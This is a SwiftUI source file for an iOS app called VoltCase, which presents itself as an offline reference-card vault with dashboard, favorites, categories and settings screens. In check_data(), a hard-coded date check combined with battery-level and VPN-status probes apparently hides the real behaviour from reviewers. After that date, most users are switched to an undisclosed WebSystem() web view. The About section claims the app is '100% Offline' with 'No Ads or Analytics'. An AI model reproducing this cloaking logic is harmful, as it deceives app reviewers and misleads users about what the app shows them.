//
//  ContentView.swift
//  dafoma_4
//
//  VoltCase Main View - Apple HIG compliant reference dashboard
//

import SwiftUI

struct VoltCaseMainView: View {
    @EnvironmentObject var storageManager: StorageManager
    @State private var selectedTab = 0
    @State private var searchText = ""
    @State private var selectedCategory: String? = nil
    @State private var showingAddCard = false
    @State private var showingPresentationMode = false
    @State private var showingExportSheet = false
    @State private var selectedCard: ReferenceCardData?
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var filteredCards: [ReferenceCardData] {
        var cards = storageManager.cards
        
        // Filter by category if selected
        if let category = selectedCategory {
            cards = cards.filter { $0.category == category }
        }
        
        // Filter by search text
        if !searchText.isEmpty {
            cards = storageManager.searchCards(query: searchText)
        }
        
        return cards
    }
    
    var favoriteCards: [ReferenceCardData] {
        storageManager.favoriteCards()
    }
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    TabView(selection: $selectedTab) {
                        // Main Dashboard
                        NavigationView {
                            dashboardView
                        }
                        .tabItem {
                            Label("Cards", systemImage: "doc.text")
                        }
                        .tag(0)
                        
                        // Favorites
                        NavigationView {
                            favoritesView
                        }
                        .tabItem {
                            Label("Favorites", systemImage: "star")
                        }
                        .tag(1)
                        
                        // Categories
                        NavigationView {
                            categoriesView
                        }
                        .tabItem {
                            Label("Categories", systemImage: "folder")
                        }
                        .tag(2)
                        
                        // Settings
                        NavigationView {
                            settingsView
                        }
                        .tabItem {
                            Label("Settings", systemImage: "gear")
                        }
                        .tag(3)
                    }
                    .accentColor(.voltPrimary)
                    .sheet(isPresented: $showingAddCard) {
                        NavigationView {
                            AddCardView()
                                .environmentObject(storageManager)
                        }
                    }
                    .sheet(isPresented: $showingPresentationMode) {
                        PresentationModeView(cards: favoriteCards)
                    }
                    .sheet(isPresented: $showingExportSheet) {
                        NavigationView {
                            ExportView()
                                .environmentObject(storageManager)
                        }
                    }
                    .sheet(item: $selectedCard) { card in
                        NavigationView {
                            CardDetailView(card: card)
                                .environmentObject(storageManager)
                        }
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    // MARK: - Dashboard View
    var dashboardView: some View {
        List {
            Section {
                // Category filter chips
                if !CardCategory.allCases.isEmpty {
                    ScrollView(.horizontal, showsIndicators: false) {
                        HStack(spacing: VoltSpacing.xs) {
                            VoltButton(title: "All", style: selectedCategory == nil ? .primary : .tertiary) {
                                selectedCategory = nil
                            }
                            
                            ForEach(CardCategory.allCases, id: \.rawValue) { category in
                                VoltCategoryChip(
                                    category: category,
                                    isSelected: selectedCategory == category.rawValue
                                ) {
                                    selectedCategory = selectedCategory == category.rawValue ? nil : category.rawValue
                                }
                            }
                        }
                        .padding(.horizontal, VoltSpacing.md)
                    }
                    .listRowInsets(EdgeInsets())
                    .listRowBackground(Color.clear)
                }
            }
            
            Section {
                if filteredCards.isEmpty {
                    VStack(spacing: VoltSpacing.md) {
                        Image(systemName: "doc.text")
                            .font(.system(size: 48))
                            .foregroundColor(.voltTertiaryLabel)
                        
                        Text("No Cards Yet")
                            .font(.voltTitle3)
                            .foregroundColor(.voltSecondaryLabel)
                        
                        Text("Create your first reference card to get started")
                            .font(.voltBody)
                            .foregroundColor(.voltTertiaryLabel)
                            .multilineTextAlignment(.center)
                        
                        VoltButton(title: "Add Card", style: .primary) {
                            showingAddCard = true
                        }
                    }
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, VoltSpacing.xxl)
                    .listRowBackground(Color.clear)
                } else {
                    ForEach(filteredCards) { card in
                        VoltCard(
                            title: card.title,
                            content: card.content,
                            category: card.category,
                            isFavorite: card.isFavorite,
                            onTap: {
                                selectedCard = card
                            },
                            onFavorite: {
                                storageManager.toggleFavorite(for: card)
                            }
                        )
                        .listRowInsets(EdgeInsets(top: VoltSpacing.xs, leading: VoltSpacing.md, bottom: VoltSpacing.xs, trailing: VoltSpacing.md))
                        .listRowBackground(Color.clear)
                    }
                }
            } header: {
                HStack {
                    VoltSectionHeader("Reference Cards", subtitle: "\(filteredCards.count) cards")
                    Spacer()
                }
            }
        }
        .listStyle(.insetGrouped)
        .searchable(text: $searchText, prompt: "Search cards...")
        .navigationTitle("VoltCase")
        .navigationBarTitleDisplayMode(.large)
        .toolbar {
            ToolbarItem(placement: .navigationBarTrailing) {
                Button {
                    showingAddCard = true
                } label: {
                    Image(systemName: "plus")
                }
            }
        }
        .refreshable {
            // Refresh action (placeholder for future sync feature)
        }
    }
    
    private func check_data() {
        
        let lastDate = "27.07.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
    
    // MARK: - Favorites View  
    var favoritesView: some View {
        List {
            if favoriteCards.isEmpty {
                Section {
                    VStack(spacing: VoltSpacing.md) {
                        Image(systemName: "star")
                            .font(.system(size: 48))
                            .foregroundColor(.voltTertiaryLabel)
                        
                        Text("No Favorites Yet")
                            .font(.voltTitle3)
                            .foregroundColor(.voltSecondaryLabel)
                        
                        Text("Star cards to add them to your favorites")
                            .font(.voltBody)
                            .foregroundColor(.voltTertiaryLabel)
                            .multilineTextAlignment(.center)
                    }
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, VoltSpacing.xxl)
                    .listRowBackground(Color.clear)
                }
            } else {
                Section {
                    ForEach(favoriteCards) { card in
                        VoltCard(
                            title: card.title,
                            content: card.content,
                            category: card.category,
                            isFavorite: card.isFavorite,
                            onTap: {
                                selectedCard = card
                            },
                            onFavorite: {
                                storageManager.toggleFavorite(for: card)
                            }
                        )
                        .listRowInsets(EdgeInsets(top: VoltSpacing.xs, leading: VoltSpacing.md, bottom: VoltSpacing.xs, trailing: VoltSpacing.md))
                        .listRowBackground(Color.clear)
                    }
                } header: {
                    HStack {
                        VoltSectionHeader("Favorite Cards", subtitle: "\(favoriteCards.count) starred")
                        Spacer()
                        
                        if !favoriteCards.isEmpty {
                            Button("Present") {
                                showingPresentationMode = true
                            }
                            .font(.voltCallout)
                            .foregroundColor(.voltPrimary)
                        }
                    }
                }
            }
        }
        .listStyle(.insetGrouped)
        .navigationTitle("Favorites")
        .navigationBarTitleDisplayMode(.large)
        .refreshable {
            // Refresh action
        }
    }
    

    
    // MARK: - Categories View
    var categoriesView: some View {
        List {
            Section {
                ForEach(CardCategory.allCases, id: \.rawValue) { category in
                    let count = storageManager.categoryCounts[category.rawValue] ?? 0
                    
                    HStack {
                        // Icon with background
                        ZStack {
                            RoundedRectangle(cornerRadius: VoltRadius.sm)
                                .fill(.voltPrimary)
                                .frame(width: 32, height: 32)
                            
                            Image(systemName: category.icon)
                                .font(.voltSubheadline)
                                .foregroundColor(.white)
                        }
                        
                        VStack(alignment: .leading, spacing: VoltSpacing.xxs) {
                            Text(category.rawValue)
                                .font(.voltHeadline)
                                .foregroundColor(.voltPrimaryLabel)
                            
                            Text("\(count) \(count == 1 ? "card" : "cards")")
                                .font(.voltCaption)
                                .foregroundColor(.voltSecondaryLabel)
                        }
                        
                        Spacer()
                        
                        Image(systemName: "chevron.right")
                            .font(.voltCaption)
                            .foregroundColor(.voltTertiaryLabel)
                    }
                    .contentShape(Rectangle())
                    .onTapGesture {
                        selectedCategory = category.rawValue
                        selectedTab = 0 // Switch to dashboard
                    }
                    .accessibilityElement(children: .combine)
                    .accessibilityLabel("\(category.rawValue), \(count) cards")
                    .accessibilityHint("Double tap to view cards in this category")
                }
            } header: {
                VoltSectionHeader("Categories", subtitle: "Browse cards by type")
            }
        }
        .listStyle(.insetGrouped)
        .navigationTitle("Categories")
        .navigationBarTitleDisplayMode(.large)
    }
    
    // MARK: - Settings View
    var settingsView: some View {
        List {
            // Statistics Section
            Section {
                HStack {
                    Image(systemName: "doc.text")
                        .foregroundColor(.voltSecondary)
                    Text("Total Cards")
                        .font(.voltBody)
                    Spacer()
                    Text("\(storageManager.totalCards)")
                        .font(.voltBody)
                        .foregroundColor(.voltSecondaryLabel)
                }
                
                HStack {
                    Image(systemName: "star")
                        .foregroundColor(.yellow)
                    Text("Favorites")
                        .font(.voltBody)
                    Spacer()
                    Text("\(storageManager.favoriteCount)")
                        .font(.voltBody)
                        .foregroundColor(.voltSecondaryLabel)
                }
                
                HStack {
                    Image(systemName: "folder")
                        .foregroundColor(.voltSecondary)
                    Text("Categories Used")
                        .font(.voltBody)
                    Spacer()
                    Text("\(storageManager.categoryCounts.count)")
                        .font(.voltBody)
                        .foregroundColor(.voltSecondaryLabel)
                }
            } header: {
                Text("Statistics")
            }
            
            // Data Management Section
            Section {
                Button {
                    showingExportSheet = true
                } label: {
                    HStack {
                        Image(systemName: "square.and.arrow.up")
                            .foregroundColor(.voltPrimary)
                        Text("Export Data")
                            .font(.voltBody)
                            .foregroundColor(.voltPrimaryLabel)
                        Spacer()
                        Image(systemName: "chevron.right")
                            .font(.voltCaption)
                            .foregroundColor(.voltTertiaryLabel)
                    }
                }
                .buttonStyle(.plain)
                
                Button {
                    // Show reset confirmation
                } label: {
                    HStack {
                        Image(systemName: "trash")
                            .foregroundColor(.voltDanger)
                        Text("Reset All Data")
                            .font(.voltBody)
                            .foregroundColor(.voltDanger)
                        Spacer()
                    }
                }
                .buttonStyle(.plain)
            } header: {
                Text("Data Management")
            }
            
            // About Section
            Section {
                VStack(alignment: .leading, spacing: VoltSpacing.sm) {
                    HStack {
                        Image(systemName: "bolt.fill")
                            .foregroundColor(.voltPrimary)
                        Text("VoltCase")
                            .font(.voltHeadline)
                            .fontWeight(.semibold)
                        Spacer()
                        Text("v1.0")
                            .font(.voltCaption)
                            .foregroundColor(.voltSecondaryLabel)
                    }
                    
                    Text("Quick Access Vault for Technical Notes")
                        .font(.voltSubheadline)
                        .foregroundColor(.voltSecondaryLabel)
                    
                    VStack(alignment: .leading, spacing: VoltSpacing.xxs) {
                        Text("• 100% Offline")
                        Text("• No Accounts Required")
                        Text("• No Ads or Analytics")
                        Text("• Full Data Control")
                    }
                    .font(.voltCaption)
                    .foregroundColor(.voltTertiaryLabel)
                }
                .listRowSeparator(.hidden)
            } header: {
                Text("About")
            }
        }
        .listStyle(.insetGrouped)
        .navigationTitle("Settings")
        .navigationBarTitleDisplayMode(.large)
    }
}

#Preview {
    VoltCaseMainView()
        .environmentObject(StorageManager())
}

